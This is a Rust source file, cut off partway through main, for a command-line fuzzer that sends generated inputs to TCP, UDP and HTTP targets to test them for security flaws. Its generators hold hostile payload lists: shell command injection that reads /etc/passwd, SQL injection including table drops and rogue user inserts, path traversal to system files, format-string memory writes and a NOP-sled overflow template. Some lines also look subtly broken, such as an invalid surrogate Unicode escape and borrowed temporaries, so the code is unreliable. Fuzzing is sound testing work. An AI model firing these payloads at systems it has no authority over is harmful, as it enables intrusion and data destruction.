//! # Protocol Fuzzer - Security Testing Tool
//!
//! This tool performs fuzz testing against network protocols and applications
//! to discover vulnerabilities like:
//! - Buffer overflows
//! - Format string bugs
//! - Integer overflows
//! - Denial of service conditions
//! - Input validation failures
//!
//! ## What is Fuzzing?
//!
//! Fuzzing is an automated testing technique that:
//! 1. Generates malformed/unexpected inputs
//! 2. Sends them to a target application
//! 3. Monitors for crashes, hangs, or unexpected behavior
//!
//! ## Fuzzing Strategies
//!
//! ### Mutation-Based Fuzzing
//! - Takes valid inputs and mutates them
//! - Bit flips, byte insertions, deletions
//! - Preserves structure while breaking data
//!
//! ### Generation-Based Fuzzing
//! - Generates inputs from protocol specification
//! - Can reach deeper into application logic
//! - Requires understanding of the protocol
//!
//! ### Coverage-Guided Fuzzing (not in this basic impl)
//! - Uses code coverage feedback
//! - Keeps inputs that discover new paths
//! - Most effective for finding deep bugs
//!
//! ## Fuzzing Categories
//!
//! This tool supports:
//! - **Strings**: Long strings, format strings, special characters
//! - **Integers**: Boundary values, negative numbers, overflows
//! - **Binary**: Random bytes, structured binary data
//! - **Protocol**: HTTP, DNS, FTP specific fuzzers
//!
//! ## Security Considerations
//!
//! - Only fuzz systems you own or have permission to test
//! - Fuzzing can cause crashes and data corruption
//! - Run targets in isolated environments (VMs, containers)

use anyhow::{Context, Result};
use chrono::Utc;
use clap::{Parser, Subcommand, ValueEnum};
use colored::*;
use indicatif::{ProgressBar, ProgressStyle};
use rand::{rngs::StdRng, Rng, SeedableRng};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs::File;
use std::io::{Read, Write};
use std::net::{TcpStream, UdpSocket};
use std::path::PathBuf;
use std::time::{Duration, Instant};
use thiserror::Error;

// ============================================================================
// ERROR HANDLING
// ============================================================================

/// Fuzzer errors
#[derive(Error, Debug)]
pub enum FuzzerError {
    #[error("Connection failed: {0}")]
    ConnectionError(String),

    #[error("Send failed: {0}")]
    SendError(String),

    #[error("Receive timeout")]
    Timeout,

    #[error("Target crashed or closed connection")]
    TargetCrashed,

    #[error("Invalid configuration: {0}")]
    ConfigError(String),

    #[error("IO error: {0}")]
    IoError(#[from] std::io::Error),
}

// ============================================================================
// CLI INTERFACE
// ============================================================================

/// Protocol Fuzzer - Automated Security Testing Tool
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[command(subcommand)]
    command: Commands,

    /// Verbose output
    #[arg(short, long)]
    verbose: bool,
}

#[derive(Subcommand, Debug)]
enum Commands {
    /// Generate fuzz test cases
    Generate {
        /// Type of test cases to generate
        #[arg(short, long, value_enum)]
        fuzz_type: FuzzType,

        /// Number of test cases
        #[arg(short, long, default_value = "100")]
        count: usize,

        /// Output file
        #[arg(short, long)]
        output: Option<PathBuf>,

        /// Random seed for reproducibility
        #[arg(long)]
        seed: Option<u64>,
    },

    /// Fuzz a TCP service
    Tcp {
        /// Target host
        #[arg(short = 'H', long)]
        host: String,

        /// Target port
        #[arg(short, long)]
        port: u16,

        /// Fuzz type
        #[arg(short, long, value_enum, default_value = "string")]
        fuzz_type: FuzzType,

        /// Number of test cases
        #[arg(short, long, default_value = "100")]
        count: usize,

        /// Timeout per request (ms)
        #[arg(long, default_value = "1000")]
        timeout: u64,

        /// Delay between requests (ms)
        #[arg(long, default_value = "100")]
        delay: u64,

        /// Prefix before fuzz data
        #[arg(long)]
        prefix: Option<String>,

        /// Suffix after fuzz data
        #[arg(long)]
        suffix: Option<String>,
    },

    /// Fuzz a UDP service
    Udp {
        /// Target host
        #[arg(short = 'H', long)]
        host: String,

        /// Target port
        #[arg(short, long)]
        port: u16,

        /// Fuzz type
        #[arg(short, long, value_enum, default_value = "binary")]
        fuzz_type: FuzzType,

        /// Number of test cases
        #[arg(short, long, default_value = "100")]
        count: usize,

        /// Delay between packets (ms)
        #[arg(long, default_value = "10")]
        delay: u64,
    },

    /// Fuzz HTTP endpoints
    Http {
        /// Target URL
        #[arg(short, long)]
        url: String,

        /// HTTP method
        #[arg(short, long, default_value = "GET")]
        method: String,

        /// Fuzz parameter name
        #[arg(short, long)]
        param: String,

        /// Fuzz type
        #[arg(short, long, value_enum, default_value = "string")]
        fuzz_type: FuzzType,

        /// Number of test cases
        #[arg(short, long, default_value = "100")]
        count: usize,
    },

    /// Analyze fuzzing results
    Analyze {
        /// Results file
        #[arg(short, long)]
        input: PathBuf,
    },
}

#[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, ValueEnum, Debug, Serialize, Deserialize)]
enum FuzzType {
    /// String fuzzing (long strings, special chars)
    String,
    /// Integer fuzzing (boundary values, overflows)
    Integer,
    /// Binary fuzzing (random bytes)
    Binary,
    /// Format string fuzzing
    FormatString,
    /// Command injection fuzzing
    Command,
    /// SQL injection fuzzing
    Sql,
    /// Path traversal fuzzing
    Path,
    /// Buffer overflow patterns
    Overflow,
}

// ============================================================================
// FUZZER CONFIGURATION
// ============================================================================

/// Configuration for fuzzing session
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FuzzerConfig {
    /// Type of fuzzing
    pub fuzz_type: FuzzType,
    /// Number of test cases
    pub count: usize,
    /// Random seed
    pub seed: u64,
    /// Timeout in milliseconds
    pub timeout_ms: u64,
    /// Delay between tests in milliseconds
    pub delay_ms: u64,
    /// Prefix to prepend
    pub prefix: Option<String>,
    /// Suffix to append
    pub suffix: Option<String>,
}

/// Result of a single fuzz test
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FuzzResult {
    /// Test case index
    pub index: usize,
    /// Input that was sent
    pub input: String,
    /// Input as hex (for binary)
    pub input_hex: Option<String>,
    /// Response received (if any)
    pub response: Option<String>,
    /// Response time in milliseconds
    pub response_time_ms: u64,
    /// Did the target crash/disconnect?
    pub crashed: bool,
    /// Any error message
    pub error: Option<String>,
    /// Timestamp
    pub timestamp: String,
}

/// Summary of fuzzing session
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FuzzSummary {
    /// Target description
    pub target: String,
    /// Configuration used
    pub config: FuzzerConfig,
    /// Start time
    pub start_time: String,
    /// End time
    pub end_time: String,
    /// Total test cases
    pub total_tests: usize,
    /// Successful sends
    pub successful: usize,
    /// Timeouts
    pub timeouts: usize,
    /// Crashes/disconnects
    pub crashes: usize,
    /// Errors
    pub errors: usize,
    /// Interesting results (potential vulnerabilities)
    pub interesting: Vec<FuzzResult>,
}

// ============================================================================
// TEST CASE GENERATORS
// ============================================================================

/// Test case generator for different fuzz types
pub struct TestCaseGenerator {
    rng: StdRng,
    fuzz_type: FuzzType,
}

impl TestCaseGenerator {
    pub fn new(fuzz_type: FuzzType, seed: u64) -> Self {
        Self {
            rng: StdRng::seed_from_u64(seed),
            fuzz_type,
        }
    }

    /// Generate the next test case
    pub fn next(&mut self) -> Vec<u8> {
        match self.fuzz_type {
            FuzzType::String => self.generate_string(),
            FuzzType::Integer => self.generate_integer(),
            FuzzType::Binary => self.generate_binary(),
            FuzzType::FormatString => self.generate_format_string(),
            FuzzType::Command => self.generate_command(),
            FuzzType::Sql => self.generate_sql(),
            FuzzType::Path => self.generate_path(),
            FuzzType::Overflow => self.generate_overflow(),
        }
    }

    /// Generate all test cases
    pub fn generate_all(&mut self, count: usize) -> Vec<Vec<u8>> {
        (0..count).map(|_| self.next()).collect()
    }

    /// Generate string test cases
    ///
    /// ## String Fuzzing Techniques
    ///
    /// 1. **Long strings**: Test buffer limits
    /// 2. **Empty strings**: Test null/empty handling
    /// 3. **Special characters**: Null bytes, newlines, unicode
    /// 4. **Repeated patterns**: "A" * 10000
    fn generate_string(&mut self) -> Vec<u8> {
        let techniques: Vec<fn(&mut Self) -> Vec<u8>> = vec![
            // Long strings of various lengths
            |s| { let len = s.rng.gen_range(100..10000); vec![b'A'; len] },
            |s| { let len = s.rng.gen_range(100..5000); vec![b'X'; len] },

            // Boundary lengths (power of 2)
            |_| vec![b'A'; 127],
            |_| vec![b'A'; 128],
            |_| vec![b'A'; 255],
            |_| vec![b'A'; 256],
            |_| vec![b'A'; 511],
            |_| vec![b'A'; 512],
            |_| vec![b'A'; 1023],
            |_| vec![b'A'; 1024],
            |_| vec![b'A'; 2048],
            |_| vec![b'A'; 4096],
            |_| vec![b'A'; 8192],
            |_| vec![b'A'; 16384],
            |_| vec![b'A'; 32768],
            |_| vec![b'A'; 65535],

            // Empty and whitespace
            |_| vec![],
            |_| vec![b' '],
            |_| vec![b'\t'; 100],
            |_| vec![b'\n'; 100],
            |_| vec![b'\r'; 100],

            // Null bytes
            |_| vec![0],
            |_| vec![0; 100],
            |s| {
                let mut v = vec![b'A'; s.rng.gen_range(10..100)];
                v.push(0);
                v.extend(vec![b'B'; s.rng.gen_range(10..100)]);
                v
            },

            // Special characters
            |_| b"<script>alert(1)</script>".to_vec(),
            |_| b"{{7*7}}".to_vec(),
            |_| b"${7*7}".to_vec(),
            |_| b"{{constructor.constructor('return this')()}}".to_vec(),

            // Unicode
            |_| "\u{0000}".as_bytes().to_vec(),
            |_| "\u{FFFF}".as_bytes().to_vec(),
            |_| "\u{0D800}".as_bytes().to_vec(),
            |_| "日本語テスト".as_bytes().to_vec(),
            |_| "\u{202E}reversed\u{202C}".as_bytes().to_vec(),
        ];

        let idx = self.rng.gen_range(0..techniques.len());
        techniques[idx](self)
    }

    /// Generate integer test cases
    ///
    /// ## Integer Fuzzing Techniques
    ///
    /// Target boundary conditions:
    /// - Maximum/minimum values for each integer type
    /// - Off-by-one values
    /// - Sign changes
    /// - Integer overflow triggers
    fn generate_integer(&mut self) -> Vec<u8> {
        let values = vec![
            // Zero and one
            "0", "1", "-1",

            // 8-bit boundaries
            "127", "128", "-128", "-129",
            "255", "256",

            // 16-bit boundaries
            "32767", "32768", "-32768", "-32769",
            "65535", "65536",

            // 32-bit boundaries
            "2147483647", "2147483648",
            "-2147483648", "-2147483649",
            "4294967295", "4294967296",

            // 64-bit boundaries
            "9223372036854775807",
            "9223372036854775808",
            "-9223372036854775808",
            "18446744073709551615",

            // Special patterns
            "0x7FFFFFFF",
            "0x80000000",
            "0xFFFFFFFF",
            "-0",
            "0.0",
            "1e308",
            "1e-308",
            "NaN",
            "Infinity",
            "-Infinity",

            // Octal and hex
            "0777",
            "0x41414141",
            "0xDEADBEEF",
        ];

        let idx = self.rng.gen_range(0..values.len());
        values[idx].as_bytes().to_vec()
    }

    /// Generate binary test cases
    ///
    /// ## Binary Fuzzing
    ///
    /// Sends raw binary data to test:
    /// - Binary protocol parsing
    /// - Non-text input handling
    /// - Memory corruption
    fn generate_binary(&mut self) -> Vec<u8> {
        let len = self.rng.gen_range(1..1000);
        let mut data = vec![0u8; len];
        self.rng.fill(&mut data[..]);
        data
    }

    /// Generate format string test cases
    ///
    /// ## Format String Vulnerabilities
    ///
    /// Format strings like %s, %x, %n can:
    /// - Read from stack (%x)
    /// - Write to memory (%n)
    /// - Crash the program (%s with invalid pointer)
    ///
    /// Detection: Unusual output, crashes, or memory access errors
    fn generate_format_string(&mut self) -> Vec<u8> {
        let patterns = vec![
            // Basic format specifiers
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            "%p%p%p%p%p%p%p%p%p%p",
            "%d%d%d%d%d%d%d%d%d%d",

            // Direct parameter access
            "%1$s%2$s%3$s%4$s%5$s",
            "%1$x%2$x%3$x%4$x%5$x",
            "%1$n%2$n%3$n%4$n%5$n",

            // Long format strings
            "%s" .repeat(100).as_str(),
            "%x".repeat(100).as_str(),
            "%n".repeat(100).as_str(),

            // Mixed patterns
            "AAAA%08x.%08x.%08x.%08x.%08x",
            "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s",

            // Width specifiers
            "%100000d",
            "%100000s",
            "%.100000d",
            "%.100000s",
            "%*.*d",
        ];

        let idx = self.rng.gen_range(0..patterns.len());
        patterns[idx].as_bytes().to_vec()
    }

    /// Generate command injection test cases
    ///
    /// ## Command Injection
    ///
    /// Tests for shell command execution vulnerabilities.
    /// If successful, attacker can execute arbitrary commands.
    fn generate_command(&mut self) -> Vec<u8> {
        let payloads = vec![
            // Basic command separators
            "; id",
            "| id",
            "|| id",
            "& id",
            "&& id",
            "; ls -la",
            "| cat /etc/passwd",

            // Backticks and $()
            "`id`",
            "$(id)",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",

            // Newlines and carriage returns
            "\nid",
            "\r\nid",
            "%0Aid",
            "%0a%0did",

            // Encoded versions
            "%3B%20id",
            "%7C%20id",
            "%26%26%20id",

            // Blind command injection (time-based)
            "; sleep 5",
            "| sleep 5",
            "& ping -c 5 127.0.0.1 &",

            // Windows-specific
            "& dir",
            "| dir",
            "; dir",
            "& type C:\\Windows\\win.ini",
        ];

        let idx = self.rng.gen_range(0..payloads.len());
        payloads[idx].as_bytes().to_vec()
    }

    /// Generate SQL injection test cases
    ///
    /// ## SQL Injection
    ///
    /// Tests for database query manipulation.
    /// Categories:
    /// - In-band (error-based, UNION-based)
    /// - Blind (boolean-based, time-based)
    /// - Out-of-band
    fn generate_sql(&mut self) -> Vec<u8> {
        let payloads = vec![
            // Basic
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR 1=1 --",
            "1' OR '1'='1",

            // UNION-based
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3--",
            "' UNION SELECT username,password FROM users--",

            // Error-based
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",

            // Time-based blind
            "' OR SLEEP(5)--",
            "' OR BENCHMARK(10000000,SHA1('test'))--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR IF(1=1,SLEEP(5),0)--",

            // Boolean-based blind
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING(@@version,1,1)='5'--",

            // Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES('hacker','password')--",

            // Comments
            "/**/",
            "--",
            "#",
            ";%00",

            // Bypasses
            "'/**/OR/**/1=1--",
            "' oR 1=1--",
            "' /*!OR*/ 1=1--",
        ];

        let idx = self.rng.gen_range(0..payloads.len());
        payloads[idx].as_bytes().to_vec()
    }

    /// Generate path traversal test cases
    ///
    /// ## Path Traversal
    ///
    /// Attempts to access files outside intended directory.
    /// Goal: Read sensitive files like /etc/passwd or C:\Windows\win.ini
    fn generate_path(&mut self) -> Vec<u8> {
        let payloads = vec![
            // Unix paths
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "../../../../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%5c..%5c..%5cetc/passwd",
            "/etc/passwd",
            "....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",

            // Windows paths
            "..\\..\\..\\windows\\win.ini",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "....\\\\....\\\\....\\\\windows\\\\win.ini",
            "C:\\Windows\\win.ini",
            "\\\\..\\\\..\\\\..\\\\windows\\\\win.ini",

            // Null byte injection (older systems)
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd\x00",

            // Protocol handlers
            "file:///etc/passwd",
            "file://C:\\Windows\\win.ini",

            // Wrapper bypass
            "....//....//....//etc/passwd",
            "..././..././etc/passwd",
        ];

        let idx = self.rng.gen_range(0..payloads.len());
        payloads[idx].as_bytes().to_vec()
    }

    /// Generate buffer overflow test cases
    ///
    /// ## Buffer Overflow Patterns
    ///
    /// Goals:
    /// - Identify crash boundaries
    /// - Pattern for offset identification
    /// - Shellcode delivery
    fn generate_overflow(&mut self) -> Vec<u8> {
        let techniques: Vec<fn(&mut Self) -> Vec<u8>> = vec![
            // Increasing length patterns
            |_| vec![b'A'; 100],
            |_| vec![b'A'; 500],
            |_| vec![b'A'; 1000],
            |_| vec![b'A'; 2000],
            |_| vec![b'A'; 5000],
            |_| vec![b'A'; 10000],
            |_| vec![b'A'; 20000],
            |_| vec![b'A'; 50000],

            // Cyclic pattern (for offset finding)
            |s| s.generate_cyclic_pattern(1000),
            |s| s.generate_cyclic_pattern(5000),
            |s| s.generate_cyclic_pattern(10000),

            // De Bruijn sequence-like pattern
            |s| {
                let mut pattern = Vec::new();
                for i in 0..1000 {
                    pattern.push(((i % 26) as u8) + b'A');
                    pattern.push(((i / 26 % 26) as u8) + b'a');
                    pattern.push(((i / 676 % 10) as u8) + b'0');
                    pattern.push(((i % 10) as u8) + b'0');
                }
                pattern
            },

            // Shellcode-like patterns (NOPs + marker)
            |_| {
                let mut payload = vec![0x90; 100]; // NOP sled
                payload.extend(b"SHELLCODE_MARKER");
                payload.extend(vec![0xCC; 100]); // INT3
                payload
            },

            // Address-like patterns (0x41414141)
            |_| vec![0x41; 500],
            |_| vec![0x42; 500],

            // Return address overwrite patterns
            |_| {
                let mut payload = vec![b'A'; 500];
                payload.extend(&[0x42, 0x42, 0x42, 0x42]); // EIP
                payload.extend(&[0x90; 100]); // NOP sled
                payload.extend(&[0xCC; 50]); // Payload
                payload
            },
        ];

        let idx = self.rng.gen_range(0..techniques.len());
        techniques[idx](self)
    }

    /// Generate cyclic pattern for offset identification
    ///
    /// Creates a unique pattern where any 4-byte sequence
    /// appears only once, allowing crash offset identification.
    fn generate_cyclic_pattern(&mut self, length: usize) -> Vec<u8> {
        let uppercase = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        let lowercase = b"abcdefghijklmnopqrstuvwxyz";
        let digits = b"0123456789";

        let mut pattern = Vec::with_capacity(length);
        let mut i = 0;

        'outer: for &c1 in uppercase.iter() {
            for &c2 in lowercase.iter() {
                for &c3 in digits.iter() {
                    pattern.push(c1);
                    pattern.push(c2);
                    pattern.push(c3);
                    i += 3;
                    if i >= length {
                        break 'outer;
                    }
                }
            }
        }

        pattern.truncate(length);
        pattern
    }
}

// ============================================================================
// NETWORK FUZZERS
// ============================================================================

/// TCP Fuzzer
pub struct TcpFuzzer {
    host: String,
    port: u16,
    config: FuzzerConfig,
    results: Vec<FuzzResult>,
}

impl TcpFuzzer {
    pub fn new(host: String, port: u16, config: FuzzerConfig) -> Self {
        Self {
            host,
            port,
            config,
            results: Vec::new(),
        }
    }

    /// Run the fuzzing session
    pub fn run(&mut self, verbose: bool) -> Result<FuzzSummary> {
        let target = format!("{}:{}", self.host, self.port);
        let start_time = Utc::now();

        println!("\n{}", "[ TCP FUZZER ]".cyan().bold());
        println!("  Target:     {}:{}", self.host, self.port);
        println!("  Fuzz Type:  {:?}", self.config.fuzz_type);
        println!("  Test Cases: {}", self.config.count);
        println!("  Timeout:    {} ms", self.config.timeout_ms);

        // Generate test cases
        let mut generator = TestCaseGenerator::new(self.config.fuzz_type, self.config.seed);

        // Progress bar
        let pb = ProgressBar::new(self.config.count as u64);
        pb.set_style(
            ProgressStyle::default_bar()
                .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} ({eta})")
                .unwrap()
                .progress_chars("=>-"),
        );

        let mut successful = 0;
        let mut timeouts = 0;
        let mut crashes = 0;
        let mut errors = 0;
        let mut interesting = Vec::new();

        for i in 0..self.config.count {
            let test_case = generator.next();

            // Apply prefix/suffix
            let mut payload = Vec::new();
            if let Some(ref prefix) = self.config.prefix {
                payload.extend(prefix.as_bytes());
            }
            payload.extend(&test_case);
            if let Some(ref suffix) = self.config.suffix {
                payload.extend(suffix.as_bytes());
            }

            let result = self.send_test_case(i, &payload, verbose);

            match &result {
                Ok(r) if r.crashed => {
                    crashes += 1;
                    interesting.push(r.clone());
                    if verbose {
                        println!("\n  {} Test case {} caused disconnect!", "[!]".red(), i);
                    }
                }
                Ok(r) if r.response_time_ms >= self.config.timeout_ms => {
                    timeouts += 1;
                }
                Ok(_) => {
                    successful += 1;
                }
                Err(_) => {
                    errors += 1;
                }
            }

            if let Ok(r) = result {
                self.results.push(r);
            }

            pb.inc(1);

            // Delay between requests
            if self.config.delay_ms > 0 {
                std::thread::sleep(Duration::from_millis(self.config.delay_ms));
            }
        }

        pb.finish_with_message("Done");

        let end_time = Utc::now();

        let summary = FuzzSummary {
            target,
            config: self.config.clone(),
            start_time: start_time.to_rfc3339(),
            end_time: end_time.to_rfc3339(),
            total_tests: self.config.count,
            successful,
            timeouts,
            crashes,
            errors,
            interesting,
        };

        self.print_summary(&summary);

        Ok(summary)
    }

    /// Send a single test case
    fn send_test_case(&self, index: usize, payload: &[u8], verbose: bool) -> Result<FuzzResult> {
        let start = Instant::now();
        let timestamp = Utc::now().to_rfc3339();

        let target = format!("{}:{}", self.host, self.port);

        let mut result = FuzzResult {
            index,
            input: String::from_utf8_lossy(payload).to_string(),
            input_hex: Some(hex::encode(payload)),
            response: None,
            response_time_ms: 0,
            crashed: false,
            error: None,
            timestamp,
        };

        // Connect
        let stream = TcpStream::connect_timeout(
            &target.parse().unwrap(),
            Duration::from_millis(self.config.timeout_ms),
        );

        match stream {
            Ok(mut stream) => {
                stream.set_write_timeout(Some(Duration::from_millis(self.config.timeout_ms)))?;
                stream.set_read_timeout(Some(Duration::from_millis(self.config.timeout_ms)))?;

                // Send payload
                match stream.write_all(payload) {
                    Ok(_) => {
                        // Try to read response
                        let mut buffer = [0u8; 4096];
                        match stream.read(&mut buffer) {
                            Ok(0) => {
                                // Connection closed - possible crash
                                result.crashed = true;
                            }
                            Ok(n) => {
                                result.response = Some(String::from_utf8_lossy(&buffer[..n]).to_string());
                            }
                            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                                // Timeout is OK
                            }
                            Err(e) => {
                                result.error = Some(e.to_string());
                            }
                        }
                    }
                    Err(e) => {
                        result.crashed = true;
                        result.error = Some(e.to_string());
                    }
                }
            }
            Err(e) => {
                result.crashed = true;
                result.error = Some(e.to_string());
            }
        }

        result.response_time_ms = start.elapsed().as_millis() as u64;

        if verbose && result.crashed {
            println!("\n  {} Payload: {} bytes", "[CRASH]".red(), payload.len());
        }

        Ok(result)
    }

    /// Print summary of results
    fn print_summary(&self, summary: &FuzzSummary) {
        println!("\n{}", "[ FUZZING SUMMARY ]".cyan().bold());
        println!("  Total Tests:    {}", summary.total_tests);
        println!("  Successful:     {}", summary.successful.to_string().green());
        println!("  Timeouts:       {}", summary.timeouts.to_string().yellow());
        println!("  Crashes:        {}",
                 if summary.crashes > 0 {
                     summary.crashes.to_string().red().bold()
                 } else {
                     summary.crashes.to_string().green()
                 });
        println!("  Errors:         {}", summary.errors);

        if !summary.interesting.is_empty() {
            println!("\n{}", "[ INTERESTING CASES ]".red().bold());
            for result in &summary.interesting {
                println!("  Test #{}: {} bytes",
                         result.index,
                         result.input.len());
                if let Some(ref hex) = result.input_hex {
                    let display = if hex.len() > 80 { &hex[..80] } else { hex };
                    println!("    Hex: {}...", display);
                }
            }
        }
    }
}

/// UDP Fuzzer
pub struct UdpFuzzer {
    host: String,
    port: u16,
    config: FuzzerConfig,
}

impl UdpFuzzer {
    pub fn new(host: String, port: u16, config: FuzzerConfig) -> Self {
        Self { host, port, config }
    }

    pub fn run(&mut self, verbose: bool) -> Result<FuzzSummary> {
        let target = format!("{}:{}", self.host, self.port);
        let start_time = Utc::now();

        println!("\n{}", "[ UDP FUZZER ]".cyan().bold());
        println!("  Target:     {}:{}", self.host, self.port);
        println!("  Fuzz Type:  {:?}", self.config.fuzz_type);
        println!("  Test Cases: {}", self.config.count);

        let socket = UdpSocket::bind("0.0.0.0:0")?;
        socket.set_read_timeout(Some(Duration::from_millis(100)))?;

        let mut generator = TestCaseGenerator::new(self.config.fuzz_type, self.config.seed);

        let pb = ProgressBar::new(self.config.count as u64);
        pb.set_style(
            ProgressStyle::default_bar()
                .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len}")
                .unwrap(),
        );

        let mut successful = 0;
        let mut errors = 0;

        for i in 0..self.config.count {
            let payload = generator.next();

            match socket.send_to(&payload, &target) {
                Ok(_) => successful += 1,
                Err(_) => errors += 1,
            }

            pb.inc(1);

            if self.config.delay_ms > 0 {
                std::thread::sleep(Duration::from_millis(self.config.delay_ms));
            }
        }

        pb.finish_with_message("Done");

        println!("\n{}", "[ RESULTS ]".cyan().bold());
        println!("  Sent:   {}", successful);
        println!("  Errors: {}", errors);

        Ok(FuzzSummary {
            target,
            config: self.config.clone(),
            start_time: start_time.to_rfc3339(),
            end_time: Utc::now().to_rfc3339(),
            total_tests: self.config.count,
            successful,
            timeouts: 0,
            crashes: 0,
            errors,
            interesting: Vec::new(),
        })
    }
}

/// HTTP Fuzzer
pub struct HttpFuzzer {
    url: String,
    method: String,
    param: String,
    config: FuzzerConfig,
}

impl HttpFuzzer {
    pub fn new(url: String, method: String, param: String, config: FuzzerConfig) -> Self {
        Self { url, method, param, config }
    }

    pub fn run(&mut self, verbose: bool) -> Result<FuzzSummary> {
        let start_time = Utc::now();

        println!("\n{}", "[ HTTP FUZZER ]".cyan().bold());
        println!("  URL:        {}", self.url);
        println!("  Method:     {}", self.method);
        println!("  Parameter:  {}", self.param);
        println!("  Fuzz Type:  {:?}", self.config.fuzz_type);
        println!("  Test Cases: {}", self.config.count);

        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_millis(self.config.timeout_ms))
            .build()?;

        let mut generator = TestCaseGenerator::new(self.config.fuzz_type, self.config.seed);

        let pb = ProgressBar::new(self.config.count as u64);
        pb.set_style(
            ProgressStyle::default_bar()
                .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len}")
                .unwrap(),
        );

        let mut successful = 0;
        let mut errors = 0;
        let mut interesting = Vec::new();

        for i in 0..self.config.count {
            let payload = generator.next();
            let payload_str = String::from_utf8_lossy(&payload).to_string();

            let result = match self.method.to_uppercase().as_str() {
                "GET" => {
                    let url_with_param = format!("{}?{}={}", self.url, self.param, urlencoding::encode(&payload_str));
                    client.get(&url_with_param).send()
                }
                "POST" => {
                    let mut params = HashMap::new();
                    params.insert(&self.param, payload_str.clone());
                    client.post(&self.url).form(&params).send()
                }
                _ => {
                    client.get(&self.url).send()
                }
            };

            match result {
                Ok(response) => {
                    successful += 1;
                    let status = response.status();

                    // Check for interesting responses
                    if status.is_server_error() {
                        if verbose {
                            println!("\n  {} Status {} for payload #{}", "[!]".yellow(), status, i);
                        }
                        interesting.push(FuzzResult {
                            index: i,
                            input: payload_str,
                            input_hex: Some(hex::encode(&payload)),
                            response: Some(format!("Status: {}", status)),
                            response_time_ms: 0,
                            crashed: false,
                            error: None,
                            timestamp: Utc::now().to_rfc3339(),
                        });
                    }
                }
                Err(e) => {
                    errors += 1;
                    if verbose {
                        println!("\n  {} Error: {}", "[!]".red(), e);
                    }
                }
            }

            pb.inc(1);

            if self.config.delay_ms > 0 {
                std::thread::sleep(Duration::from_millis(self.config.delay_ms));
            }
        }

        pb.finish_with_message("Done");

        println!("\n{}", "[ RESULTS ]".cyan().bold());
        println!("  Successful: {}", successful);
        println!("  Errors:     {}", errors);
        println!("  Interesting:{}", interesting.len());

        Ok(FuzzSummary {
            target: self.url.clone(),
            config: self.config.clone(),
            start_time: start_time.to_rfc3339(),
            end_time: Utc::now().to_rfc3339(),
            total_tests: self.config.count,
            successful,
            timeouts: 0,
            crashes: 0,
            errors,
            interesting,
        })
    }
}

// ============================================================================
// MAIN
// ============================================================================

fn main() -> Result<()> {
    let args = Args::parse();

    match args.command {
        Commands::Generate { fuzz_type, count, output, seed } => {
            let seed = seed.unwrap_or_else(|| rand::thread_rng().gen());
            let mut generator = TestCaseGenerator::new(fuzz_type, seed);
            let test_cases = generator.generate_all(count);

            println!("\n{}", "[ TEST CASE GENERATOR ]".cyan().bold());
            println!("  Type:   {:?}", fuzz_type);
            println!("  Count:  {}", count);
            println!("  Seed:   {}", seed);

            match output {
                Some(path) => {
                    let mut file = File::create(&path)?;
                    for (i, tc) in test_cases.iter().enumerate() {
                        writeln!(file, "# Test case {}", i)?;
                        writeln!(file, "{}", hex::encode(tc))?;
                    }
                    println!("\n  Output: {:?}", path);
                }
                None => {
                    println!("\n{}", "[ SAMPLE TEST CASES ]".cyan());
                    for (i, tc) in test_cases.iter().take(10).enumerate() {
                        let display = if tc.len() > 50 {
                            format!("{}... ({} bytes)", hex::encode(&tc[..50]), tc.len())
                        } else {
                            hex::encode(tc)
                        };
                        println!("  {}: {}", i, display);
                    }
                    if count > 10 {
                        println!("  ... and {} more", count - 10);
                    }
                }
            }
        }

        Commands::Tcp { host, port, fuzz_type, count, timeout, delay, prefix, suffix } => {
            let config = FuzzerConfig {
                fuzz_type,
                count,
                seed: rand::thread_rng().gen(),
                timeout_ms: timeout,
                delay_ms: delay,
                prefix,
                suffix,
            };

            let mut fuzzer = TcpFuzzer::new(host, port, config);
            let summary = fuzzer.run(args.verbose)?;

            // Save results
            let results_file = format!("fuzz_results_{}.json", Utc::now().format("%Y%m%d_%H%M%S"));
            let json = serde_json::to_string_pretty(&summary)?;
            std::fs::write(&results_file, json)?;
            println!("\n  Results saved to: {}", results_file);
        }

        Commands::Udp { host, port, fuzz_type, count, delay } => {
            let config = FuzzerConfig {
                fuzz_type,
                count,
                seed: rand::thread_rng().gen(),
                timeout_ms: 1000,
                delay_ms: delay,
                prefix: None,
                suffix: None,
            };

            let mut fuzzer = UdpFuzzer::new(host, port, config);
            fuzzer.run(args.verbose)?;
        }

        Commands::Http { url, method, param, fuzz_type, count } => {
            let config = FuzzerConfig {
                fuzz_type,
                count,
